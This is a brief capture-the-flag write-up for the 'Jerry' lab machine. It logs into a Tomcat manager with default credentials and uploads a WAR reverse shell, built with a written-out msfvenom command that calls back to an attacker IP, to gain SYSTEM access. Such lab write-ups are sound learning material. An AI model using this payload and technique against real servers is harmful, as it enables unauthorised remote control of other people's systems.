# CTF Writeup: Jerry

---

- Step 1: added <target_ip> to /etc/hosts and ran nmap scan --> 8080 is open
- Step 2: navigated to the tomcat webpage and found login prompt under /manager/html
- Step 3: searched up for tomcat default credentials --> tomcat:s3cret --> logged in
- Step 4: saw an upload option, which only accepts .war payloads.
- Step 5: created .war reverse shell by making --> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.34 LPORT=4444 -f war > shell.war
- Step 6: uploaded it and started up my listener --> once clicking on the file I gained an rce 
- Step 7: gained rce as NT AUTHORITY/SYSTEM.
- Step 8: navigated to C:\\Users\Administrator\Desktop\flags\ 
- Step 9: displayed flag --> made type "2 for the price of 1.txt"
- Step 10: retrieved user.txt & root.txt flag

---

## Key Learnings

- Increased Tomcat Knowledge
- Slightly increased rev shell payload creation knowledge
- Slightly increased Windows CLI Knowledge
